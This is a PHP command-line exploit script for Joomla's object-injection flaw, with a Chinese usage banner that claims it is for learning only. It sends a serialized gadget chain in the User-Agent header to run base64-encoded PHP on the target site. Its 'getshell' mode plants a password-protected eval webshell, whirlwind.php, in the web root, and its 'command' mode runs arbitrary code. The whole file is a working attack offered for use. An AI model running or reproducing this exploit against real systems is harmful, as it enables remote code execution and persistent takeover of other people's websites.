<?php
if (isset($argv[1])) {
	$url = $argv[1];
} else {
	$url = "";
}
if (isset($argv[2])) {
	$method = $argv[2];
} else {
	$method = "";
}
switch ($method) {
case 'getshell':
	//webshell code
	$shell = '<?php @eval($_REQUEST[whirlwind]);';
	$getshellcommand = 'file_put_contents($_SERVER[\'DOCUMENT_ROOT\'].\'/whirlwind.php\',\'' . $shell . '\');';
	hackjoomla($url, $getshellcommand);
	if (preg_match("/hello/", @file_get_contents($url . '/whirlwind.php?whirlwind=echo+"hello";')) !== 0) {
		print "shell:" . $url . "/whirlwind.php\nPassword:whirlwind\n";
	} else {
		print "error?";
	}
	break;
case 'command':
	$command = $argv[3];
	$info = hackjoomla($url, $command);
	print $info;
	break;
default:
	print("--------------- Joomla 反序列化漏洞利用工具---------------\n|      1.记得命令后头加分号，命令用单引号括起来。        |\n|      2.仅供学习php代码使用                             |\n|Usage:                                                  |\n|php joomla.php http://xatusec.org getshell              |\n|php joomla.php http://xatusec.org command 'phpinfo();'  |\n-------------------Powered by Whirlwind-------------------\n");
	break;
}
function hackjoomla($url, $command) {
	$command = base64_encode($command);
	$command = str_replace("=", "", $command);

	$strlen = strlen($command) + 49;
	$ua = '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:' . $strlen . ':"eval(base64_decode(' . $command . '));JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}' . urldecode('%F0%9D%8C%86');

	$ch = curl_init();
	$cookiefile = "";
	curl_setopt($ch, CURLOPT_URL, $url);
	//user-agent
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	//return string
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	//save cookie
	curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiefile);
	//timeout
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	//proxy
	curl_exec($ch);
	$response = curl_exec($ch);
	curl_close($ch);
	return $response;
}
